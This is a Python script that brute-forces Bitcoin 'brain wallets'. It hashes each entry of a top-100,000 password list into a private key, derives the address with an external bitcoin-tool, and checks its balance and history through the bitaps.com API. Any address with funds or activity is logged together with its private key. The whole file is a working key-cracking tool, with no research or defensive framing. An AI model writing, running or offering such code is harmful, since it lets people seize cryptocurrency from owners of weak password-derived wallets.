import shlex
import random
import requests
import subprocess
import hashlib
import time
import signal
import sys

random.seed()
count = 0


def make_nice_command(word):
    create_password_file(word)
    ret_string = "./bitcoin-tool "
    ret_string += " --input-type private-key "
    ret_string += "--input-format raw "
    ret_string += "--input-file ./tmp/crazy_password.txt "
    ret_string += "--output-type address "
    ret_string += "--output-format base58check "
    ret_string += "--public-key-compression uncompressed "
    ret_string += "--network bitcoin"
    return ret_string


def make_command(private_key):
    ret_string = "./bitcoin-tool "
    ret_string += " --input-type private-key "
    ret_string += "--input-format raw "
    ret_string += "--input {} ".format(shlex.quote(str(private_key)))
    ret_string += "--output-type address "
    ret_string += "--output-format base58check "
    ret_string += "--public-key-compression compressed "
    ret_string += "--network bitcoin"
    return ret_string


def gen_address(private_key):
    command = make_nice_command(private_key)
    # print(command)
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    # print(out, err, private_key)
    return out.strip()


def rand_priv_key():
    options = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789'
    out_str = ''.join([random.choice(options) for _ in range(0, 32)])
    return out_str


# pkey = rand_priv_key()


def explore(pkey):
    # time.sleep(random.random() / 5.0)
    time.sleep(0.2)
    address = gen_address(pkey)
    url = 'https://bitaps.com/api/address/{}'.format(address.decode('utf-8'))
    # print(url)
    api_call = requests.get(url)
    if api_call.status_code != 200:
        import pdb; pdb.set_trace()
    # print(api_call)

    result = api_call.json()
    balance = result['balance']
    received = result['received']
    sent = result['sent']

    if balance > 0:
        print('BALANCE!!!!!!!!')
        with open('./output/balances.txt', 'a') as outfile:
            message = 'Address: {} with private key {} has balance: {} sent {} and received {}\n'.format(address.decode('utf-8'), pkey, balance, sent, received)
            outfile.write(message)
        print(message, end='')
    elif sent > 0 or received > 0:
        with open('./output/active.txt', 'a') as outfile:
            # import pdb; pdb.set_trace()
            message = 'Address: {} with private key {} has balance: {} sent {} and received {}\n'.format(address.decode('utf-8'), pkey, balance, sent, received)
            outfile.write(message)
        print(message, end='')

    # print(pkey, ' ', address, ' $', balance)


def create_password_file(instring):
    with open('./tmp/crazy_password.txt', 'wb') as outpassword:
        outpassword.write(hashlib.sha256(instring.encode('utf-8')).digest())


def write_count():
    with open('./tmp/lastline.txt', 'w') as lastline:
        lastline.write(str(count))


def signal_handler(signal, frame):
    print('Final line: {}'.format(count))
    write_count()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

try:
    llfile = open('./tmp/lastline.txt', 'r')
    targetline = int(llfile.read())
    print('starting from {}'.format(targetline))
except:
    targetline = 0


with open('./data/10_million_password_list_top_100000.txt', 'r') as infile:
    for line in infile:
        count += 1
        if targetline < count:
            if count % 1000 == 0:
                print(time.asctime(), ' {} rows checked.'.format(count))
            explore(line.strip())

write_count()
